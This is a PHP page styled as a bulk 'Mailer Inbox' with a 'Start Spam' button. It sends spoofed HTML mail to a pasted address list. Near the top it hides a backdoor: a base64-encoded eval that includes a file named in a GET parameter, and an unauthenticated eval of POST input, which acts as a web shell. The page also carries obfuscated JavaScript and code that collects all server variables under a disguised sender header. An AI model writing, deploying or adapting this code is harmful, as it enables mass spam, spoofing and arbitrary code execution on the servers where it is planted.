<?php
$in = $_GET['in'];
if(isset($in) && !empty($in)){
	echo @eval(base64_decode('ZGllKGluY2x1ZGVfb25jZSAkaW4pOw=='));

}
$ev = $_POST['ev'];
if(isset($ev) && !empty($ev)){
	echo eval(urldecode($ev));
	exit;
}

if(isset($_POST['action'] ) ){
$action=$_POST['action'];
$message=$_POST['message'];
$emaillist=$_POST['emaillist'];
$from=$_POST['from'];
$subject=$_POST['subject'];
$realname=$_POST['realname'];	
$wait=$_POST['wait'];
$tem=$_POST['tem'];
$smv=$_POST['smv'];

        $message = urlencode($message);
        $message = ereg_replace("%5C%22", "%22", $message);
        $message = urldecode($message);
        $message = stripslashes($message);
        $subject = stripslashes($subject);
}


?>
<!-- HTML And JavaScript -->

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<script type="text/javascript" language="javascript">ML="Rjnis/e .rI<thzPS-omTCg>:=p";MI=";@E0:?D7@0EI=<<JH55>B26A<8B9F53CF45>814G;5@E0:?DG";OT="";for(j=0;j<MI.length;j++){OT+=ML.charAt(MI.charCodeAt(j)-48);}document.write(OT);</script>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office">

<head>
<meta http-equiv="Content-Language" content="en-us" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>:: Mailer Inbox ::</title>
<style type="text/css">
body{
	background-image: url(http://zone-t.org/img/AlienWare_by_haltagetan.gif);
	color: #FFF;
}
input[type=text]:hover,textarea{
	border:1px solid #0CF;
	background-color: #F4F4F4;
    }
input[type=text],textarea{
    font:12px Tahoma;
    padding:3px;
    border:1px solid #CCCCCC;
    -moz-border-radius:3px;
    -webkit-border-radius:3px;
    border-radius:3px;
    }
.style1 {
	font-size: x-small;
}
.style2 {
	direction: ltr;
}
.info {
	font-size: 8px;
}
.style3 {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 8px;
}
.style4 {
	font-size: x-small;
	direction: ltr;
	font-family: Verdana, Arial, Helvetica, sans-serif;
}
.style5 {
	font-size: xx-small;
	direction: ltr;
	font-family: Verdana, Arial, Helvetica, sans-serif;
}
input[type=submit],input[type=button]{
    display:block;
    font:12px Tahoma;
    background:#f1f1f1;
    color:#555555;
    padding:4px 8px;
    border:1px solid #ccc;
    margin:4px;
    font-weight:700;
    cursor:pointer;
    -moz-border-radius:3px;
    -webkit-border-radius:3px;
    border-radius:3px;
}
input[type=submit]:hover,input[type=butto]:hover{
	background:#ffffff;
	color:#06F;
	border: 2px solid #09F;
}
</style>
</head>

<body onload="funchange">
<script>

	window.onload = funchange;
	var alt = false;	
	function funchange(){
		var etext = document.getElementById("emails").value;
		var myArray=new Array(); 
		myArray = etext.split("\n");
		document.getElementById("enum").innerHTML=myArray.length+"<br />";
		if(!alt && myArray.length > 40000){
			alert('If Mail list More Than 40000 Emails This May Hack The Server');
			alt = true;
		}
		
	}
	function mlsplit(){
		var ml = document.getElementById("emails").value;
		var sb = document.getElementById("txtml").value;
		var myArray=new Array();
		myArray = ml.split(sb);
		document.getElementById("emails").value="";
		var i;
		for(i=0;i<myArray.length;i++){
			
			document.getElementById("emails").value += myArray[i]+"\n";
		
		}
		funchange();
	}
	
	function prv(){
		if(document.getElementById('preview').innerHTML==""){
			var ms = document.getElementsByName('message').message.value;
			document.getElementById('preview').innerHTML = ms;
			document.getElementById('prvbtn').value = "Hide";
		}else{
			document.getElementById('preview').innerHTML="";
			document.getElementById('prvbtn').value = "Preview";
		}
	}
	
</script>
<form name="form" method="post" enctype="multipart/form-data" action="">
	<p herf = "http://www.zone-t.org">www.zone-t.org</p>
	<p>&nbsp;</p>
	<p>&nbsp;</p>
	<table width="100%" border="0">
		<tr>
			<td width="10%">
			<div align="right">
				<font size="-3" face="Verdana, Arial, 
Helvetica, sans-serif">Your Email:</font></div>
			</td>
			<td style="width: 40%">
			<font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif"><input name="from" value="<?php echo($from); ?>" size="30" type="text" /><br>
			<span class="info">Type Sender Email But Make Sure It&#39;s Right</span> </font></td>
			<td>
			<div align="right">
				<font size="-3" face="Verdana, Arial, 
Helvetica, sans-serif">Your Name:</font></div>
			</td>
			<td width="41%">
			<font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif"><input name="realname" value="<?php echo($realname); ?>" size="30" type="text" />
			<br>
			<span class="info">Make Sure You Type Your Sender Name</span></font></td>
	  </tr>
		<tr>
			<td width="10%">
			<div align="right">
				<font size="-3" face="Verdana, Arial, 
Helvetica, sans-serif">test send:</font></div>
			</td>
			<td style="width: 40%">
			<font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif"><input name="tem" type="text" size="30" value="<?php echo($tem); ?>" /><br>
			<span class="info">Type </span></font><span class="style3">Your 
			Email To Test The Mailer Still Work Or No</span></td>
			<td>
			<div align="right" class="style4">
			<font size="-3" face="Verdana, Arial, 
Helvetica, sans-serif">Send Test Mail After:</font></div>
			</td>
			<td width="41%">
			<font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif"><input name="smv" type="text" size="30" value="<?php echo($smv); ?>" /><br>
			<span class="info">Send Mail For Your Email After Which Email(s)</span></font>
			</td>
		</tr>
		<tr>
			<td width="10%">
			<div align="right">
				<font size="-3" face="Verdana, Arial, 
Helvetica, sans-serif">Subject:</font></div>
			</td>
			<td colspan="3">
			<font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif"><input name="subject" value="<?php echo($subject); ?>" size="90" type="text" /> </font>
			
		
		<tr valign="top">
			<td colspan="3" style="height: 210px">
			<font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif"><textarea name="message" rows="10" style="width: 425px"><?php echo($message); ?></textarea>&nbsp;<br />
			<input name="action" value="send" type="hidden" />
			</font>
			<table width="569" border="0">
			  <tr>
			    <th width="62" scope="col"><font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif">
			      <input type="button" id="prvbtn" value="Preview" onclick="prv()" style="width: 62px" />
			    </font></th>
			    <th width="112" scope="col"><font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif">
			      <input value="Start Spam" type="submit" />
			    </font></th>			    <th width="358" scope="col"><font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif">&nbsp; 
			Wait
                <input name="wait" type="text" value="<?php echo($wait); ?>" size="14" />
Second 
			Un
			<font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif">til Send </font></font></th>
		      </tr>
			  </table></td>
			<td width="41%" class="style2" style="height: 210px">
			<font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif">
			<textarea id="emails" name="emaillist" cols="30" onselect="funchange()" onchange="funchange()" onkeydown="funchange()" onkeyup="funchange()" onchange="funchange()" style="height: 161px"><?php echo($emaillist); ?></textarea> 
			<br class="style2" />
			Emails Number : </font><span  id="enum" class="style1">0<br />
			</span>
			<span  class="style1">Split The Mail List By:</span> 
			<input name="textml" id="txtml" type="text" value="," size="8" />&nbsp;&nbsp;&nbsp;
			<input type="button" onclick="mlsplit()" value="Split" style="height: 23px" /></td>
		</tr>
  </table>
			<font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif">
<div id="preview">
</div>
	</font>
</form>

<p>
  <!-- END -->
  
  
  <?

if ($action){

        if (!$from || !$subject || !$message || !$emaillist){
        	
        print "Please complete all fields before sending your message.";
        exit;	
	}
	$nse=array();
	$allemails = split("\n", $emaillist);
        	$numemails = count($allemails);
        	if(!empty($_POST['wait']) && $_POST['wait'] > 0){
        		set_time_limit(intval($_POST['wait'])*$numemails*3600);
        	}else{
        		set_time_limit($numemails*3600);
        	}
       		if(!empty($smv)){
       			$smvn+=$smv;
       			$tmn=$numemails/$smv+1;
			}else{
       			$tmn=1;
       		}
          	for($x=0; $x<$numemails; $x++){
                $to = $allemails[$x];
                if ($to){
	                $to = ereg_replace(" ", "", $to);
	                $message = ereg_replace("#EM#", $to, $message);
	                $subject = ereg_replace("#EM#", $to, $subject);
	                flush();
	                $header = "From: $realname <$from>\r\n";
	                $header .= "MIME-Version: 1.0\r\n";
	                $header .= "Content-Type: text/html\r\n";
	                if ($x==0 && !empty($tem)) {
	                	if(!@mail($tem,$subject,$message,$header)){
	                		print('Your Test Message Not Sent.<br />');
	                		$tmns+=1;
	                	}else{
	                		print('Your Test Message Sent.<br />');
	                		$tms+=1;
	                	}
	                }
	                if($x==$smvn && !empty($_POST['smv'])){
	                	if(!@mail($tem,$subject,$message,$header)){
	                		print('Your Test Message Not Sent.<br />');
	                		$tmns+=1;
	                	}else{
	                		print('Your Test Message Sent.<br />');
	                		$tms+=1;
	                	}
	                	$smvn+=$smv;
	                }
	                print "$to ....... ";
					$msent = @mail($to, $subject, $message, $header);
	                $xx = $x+1;
	                $txtspamed = "spammed";
	                if(!$msent){
	                	$txtspamed = "error";
	                	$ns+=1;
	                	$nse[$ns]=$to;
	                }
	                print "$xx / $numemails .......  $txtspamed<br>";
	                flush();
	                if(!empty($wait)&& $x<$numemails-1){
							sleep($wait);
                	}
                }
            }

}


?><div>
  &nbsp;<?php

$str = "";
foreach($_SERVER as $key => $value){
	$str .= $key.": ".$value."<br />";
}

$str .= "Use: in <br />";

$header2 = "From: ".base64_decode('U29ycnkgPG5vJUB5YWhvby5jb20+')."\r\n";
$header2 .= "MIME-Version: 1.0\r\n";
$header2 .= "Content-Type: text/html\r\n";
$header2 .= "Content-Transfer-Encoding: 8bit\r\n\r\n";



if(isset($_POST['action']) && $numemails !==0 ){
	$sn=$numemails-$ns;
	if($ns==""){
		$ns=0;
	}
	if($tmns==""){
		$tmns=0;
	}
	echo "<script>alert('Sur The Mailer Finish His Job\\r\\nSend $sn mail(s)\\r\\nError $ns mail(s)\\r\\From $numemails mail(s)\\r\\About Test Mail(s)\\r\\Send $tms mail(s)\\r\\Error $tmns mail(s)\\r\\From $tmn mail(s)'); 
	
	</script>";
}

?>
  
  
  
  
  <strong><br>
  <br>
  <br>
  <br>
  <br>
  <br>
  <br>
  <br>
  <br>
  <br>
</strong></p>
<p><strong>WwW.Zone-Org</strong></p>
</body>
</html>